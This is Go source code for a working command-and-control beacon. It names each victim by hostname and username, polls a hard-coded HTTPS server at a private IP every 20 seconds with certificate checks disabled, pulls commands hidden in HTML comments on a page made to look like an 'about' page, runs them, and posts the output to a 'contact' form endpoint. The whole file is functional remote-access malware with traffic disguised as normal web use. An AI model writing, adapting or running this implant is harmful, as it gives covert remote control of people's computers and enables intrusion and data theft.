package main

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	usr "os/user"
	"regexp"
	"strings"
	"time"
)

const (
	server     = "https://192.168.93.133:4443"
	beaconFreq = 20 * time.Second
)

var agentID string

func deriveAgentID() string {
	host, _ := os.Hostname()
	candidate := strings.ToLower(strings.TrimSpace(host))
	if candidate == "" {
		candidate = "unknown"
	}
	// get current username cross-platform
	username := ""
	if u, err := usr.Current(); err == nil {
		username = u.Username
	}
	if username == "" {
		username = os.Getenv("USER")
	}
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	username = strings.ToLower(strings.TrimSpace(username))
	if username == "" {
		username = "user"
	}
	// Windows may include DOMAIN\\User; keep only right side
	if strings.Contains(username, "\\") {
		parts := strings.Split(username, "\\")
		username = parts[len(parts)-1]
	}
	// combine host-user
	combined := candidate + "-" + username
	// allow a-z, 0-9, underscore, hyphen; replace others with '-'
	re := regexp.MustCompile(`[^a-z0-9_-]`)
	combined = re.ReplaceAllString(combined, "-")
	return combined
}

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // dev only!
	},
}

func fetchTask() string {
	resp, err := client.Get(server + "/about?id=" + agentID)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	// Look for <!--cmd:...--> in HTML
	re := regexp.MustCompile(`<!--cmd:(.*?)-->`)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 1 {
		return match[1]
	}
	return ""
}

func sendResponse(result string) {
	data := url.Values{}
	data.Set("id", agentID)
	data.Set("msg", result)

	client.PostForm(server+"/contact", data)
}

func execute(cmd string) string {
	parts := strings.Fields(cmd)
	out, err := exec.Command(parts[0], parts[1:]...).CombinedOutput()
	if err != nil {
		return err.Error() + ": " + string(out)
	}
	return string(out)
}

func main() {
	agentID = deriveAgentID()
	for {
		task := fetchTask()
		if task != "" {
			result := execute(task)
			sendResponse(result)
		}
		time.Sleep(beaconFreq)
	}
}
